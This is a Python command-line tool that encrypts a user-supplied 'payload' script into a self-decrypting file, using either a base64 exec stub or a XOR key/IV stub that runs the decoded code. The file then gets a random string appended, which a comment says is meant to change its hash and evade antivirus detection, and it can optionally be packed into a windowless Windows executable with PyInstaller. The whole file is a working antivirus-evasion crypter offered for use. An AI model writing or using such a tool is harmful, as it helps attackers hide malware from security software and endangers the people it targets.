# Self Decrypting Logic
import os
import random
import secrets
import shutil
import string
import subprocess
import sys

BLACK = '\033[30m'
RED = '\033[31m'
GREEN = '\033[32m'
YELLOW = '\033[33m'
BLUE = '\033[34m'
MAGENTA = '\033[35m'
CYAN = '\033[36m'
WHITE = '\033[37m'
BRIGHT_BLACK = '\033[90m'
BRIGHT_RED = '\033[91m'
BRIGHT_GREEN = '\033[92m'
BRIGHT_YELLOW = '\033[93m'
BRIGHT_BLUE = '\033[94m'
BRIGHT_MAGENTA = '\033[95m'
BRIGHT_CYAN = '\033[96m'
BRIGHT_WHITE = '\033[97m'
RESET = '\033[0m'

def black(text): return f"{BLACK}{text}{RESET}"
def red(text): return f"{RED}{text}{RESET}"
def green(text): return f"{GREEN}{text}{RESET}"
def yellow(text): return f"{YELLOW}{text}{RESET}"
def blue(text): return f"{BLUE}{text}{RESET}"
def magenta(text): return f"{MAGENTA}{text}{RESET}"
def cyan(text): return f"{CYAN}{text}{RESET}"
def white(text): return f"{WHITE}{text}{RESET}"
def bright_black(text): return f"{BRIGHT_BLACK}{text}{RESET}"
def bright_red(text): return f"{BRIGHT_RED}{text}{RESET}"
def bright_green(text): return f"{BRIGHT_GREEN}{text}{RESET}"
def bright_yellow(text): return f"{BRIGHT_YELLOW}{text}{RESET}"
def bright_blue(text): return f"{BRIGHT_BLUE}{text}{RESET}"
def bright_magenta(text): return f"{BRIGHT_MAGENTA}{text}{RESET}"
def bright_cyan(text): return f"{BRIGHT_CYAN}{text}{RESET}"
def bright_white(text): return f"{BRIGHT_WHITE}{text}{RESET}"

def clear():
    if os.name == 'nt':
        _ = os.system('cls')
    else:
        _ = os.system('clear')

def base64_esd(file_path, output_file_destination=None):
    import base64
    with open(file_path, 'rb') as f:
        encode = base64.b64encode(f.read())

    if output_file_destination:
        destination = f'{str(output_file_destination).replace(".py", "")}-base64.py'
    else:
        destination = f'base64_{os.path.basename(file_path)}'
    with open(destination, 'w') as f:
        f.write(f'import base64\nexec(base64.b64decode({encode}))')
    return destination


def symmetric_key(file_path, output_file_destination=None):
    import secrets
    with open(file_path, 'rb') as file:
        data = file.read()

    key = secrets.token_bytes(16)
    iv = secrets.token_bytes(16)
    output = bytearray(iv)

    for i, byte in enumerate(data):
        output.append(byte ^ key[i % len(key)] ^ iv[i % len(iv)])

    key_str = str(list(key))
    output_str = str(list(output))

    if output_file_destination:
        destination = f'{str(output_file_destination).replace(".py", "")}-encrypted.py'
    else:
        destination = f'encrypted_{os.path.basename(file_path)}'
    with open(destination, 'w') as self_decrypting_file:
        decryption_logic = f"""
key = {key_str}
encrypted_data = {output_str}
iv = bytes(encrypted_data[:16])
encrypted_data = bytes(encrypted_data[16:])
output = bytearray()
for i, byte in enumerate(encrypted_data):
    output.append(byte ^ key[i % len(key)] ^ iv[i % len(iv)])
exec(output.decode())
"""
        self_decrypting_file.write(decryption_logic)
        return destination

def encrypt_payload(payload_file_path=None):
    if not payload_file_path:
        while True:
            payload_file_path = input('file address: ').replace('\'', '').replace('[', '').replace(']', '').replace('\"','')
            if os.path.isfile(payload_file_path):
                break
            else:
                print(f'Invalid file address: {payload_file_path}')
    print(f'{white("1. base64")} \n{white("2. Symmetric Key")} {bright_blue("(recommended)")}')
    while True:
        selection = input(f'{bright_black("> ")}')
        if selection == '1':
            encrypted_file_address = base64_esd(file_path=payload_file_path,
                                                            output_file_destination=payload_file_path)
            break
        elif selection == '2':
            encrypted_file_address = symmetric_key(file_path=payload_file_path,
                                                               output_file_destination=payload_file_path)
            break
        else:
            print('Invalid Selection')
    # add random 256 character string to the end of the file
    # to change the hash of the file to avoid detection by antivirus software for the second time

    with open(encrypted_file_address, 'r+') as file:
        randomization = ''.join(random.choices(string.ascii_letters + string.digits, k=256))

        file_content = file.read()
        updated_content = f"{file_content}\n\nrandomization = '{randomization}'\n"
        file.seek(0)
        file.write(updated_content)
        file.truncate()
    print(f'Encrypted payload created at {bright_green(encrypted_file_address)}')
    return encrypted_file_address

def make_exe(payload_file_path=None):
    if os.name != 'nt':
        print("Executable creation is only supported on Windows.")
        return

    if not payload_file_path:
        while True:
            payload_file_path = input('File address: ').strip()
            if os.path.isfile(payload_file_path):
                break
            else:
                print(f'Invalid file address: {payload_file_path}')

    try:
        # clear()
        print("Running PyInstaller to create an executable...")
        print("This may take a while.")
        random_string = ''.join(secrets.choice(string.ascii_letters) for i in range(10))
        new_working_dir = os.path.join(os.path.dirname(payload_file_path), random_string)
        os.mkdir(new_working_dir)

        with subprocess.Popen(['pyinstaller', '-F', '--clean', '-w', payload_file_path],
                              stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, cwd=new_working_dir) as proc:
            stdout, stderr = proc.communicate()
            if proc.returncode != 0:
                print("An error occurred while running PyInstaller.")
                print(stderr)
            else:

                print("PyInstaller ran successfully.")
                print(stdout)
                if 'already exists' in stdout:
                    clear()
                    print("Executable already exists in the directory.")
                    print("Moving the executable to the user's home directory.")
                exe_file_path = os.path.join(new_working_dir, 'dist', os.path.basename(payload_file_path).replace('.py', '.exe'))
                shutil.move(exe_file_path, os.path.expanduser('~'))
                execute_file_path = os.path.join(os.path.expanduser('~'), os.path.basename(payload_file_path).replace('.py', '.exe'))
                print(f"Executable created at {bright_green(execute_file_path)}")
        try:
            selection = input("Do you want to delete the temporary directory? (Y/N): ")
            if selection.upper() == 'Y':
                shutil.rmtree(new_working_dir)
        except OSError as e:
            print(f"Error: {e.strerror}")

    except subprocess.CalledProcessError as e:
        print("An error occurred while running PyInstaller.")
        print(e.output)
def main():
    clear()
    print(f'{bright_green("0. Exit")}\n{bright_green("1. Encrypt Payload")}\n{bright_green("2. Make Executable (Windows Only)")}')
    while True:
        selection = input(f'{bright_black("> ")}')
        if selection == '0':
            exit()
        elif selection == '1':
            encrypt_payload()
            break
        elif selection == '2':
            make_exe()
            break
        else:
            print('Invalid Selection')
            continue

if __name__ == '__main__':
    main()